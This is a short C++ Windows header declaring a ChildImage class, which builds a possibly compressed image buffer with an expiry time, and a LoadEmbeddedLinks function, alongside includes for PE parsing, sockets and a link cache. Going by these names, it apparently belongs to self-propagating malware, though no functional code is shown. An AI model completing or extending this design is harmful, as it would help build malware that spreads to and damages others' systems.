#pragma once

#include <windows.h>
#include "debug.h"
#include "pe.h"
#include "rand.h"
#include "linkcache.h"
#include "file.h"
#include "socketwrapper.h"
#include "mutex.h"

VOID LoadEmbeddedLinks(VOID);
//DWORD CreateChildImage(PBYTE* ImageBuffer, BOOL Compressed);

class ChildImage
{
public:
	ChildImage();
	~ChildImage();
	VOID Create(BOOL Compressed = TRUE);
	BOOL Expired(VOID);
	PBYTE GetBuffer(VOID);
	DWORD GetSize(VOID);

private:
	VOID Delete(VOID);

	CriticalSection CriticalSection;
	PBYTE Buffer;
	DWORD Size;
	DWORD Time;
};